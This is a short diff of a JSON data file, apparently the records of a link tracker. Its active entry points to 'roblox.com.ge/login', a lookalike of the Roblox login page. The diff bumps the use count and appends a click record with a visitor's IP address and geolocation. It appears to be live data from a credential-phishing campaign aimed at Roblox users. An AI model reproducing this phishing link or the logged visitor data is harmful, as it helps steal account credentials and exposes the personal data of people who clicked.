@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1609,
+    "useCount": 1610,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13040,6 +13040,14 @@
         "city": "Riyadh",
         "flag": "🇸🇦",
         "countryCode": "SA"
+      },
+      {
+        "timestamp": 1777517246751,
+        "ip": "177.234.229.35",
+        "country": "Ecuador",
+        "city": "Uzhcurrumi",
+        "flag": "🇪🇨",
+        "countryCode": "EC"
       }
     ]
   },
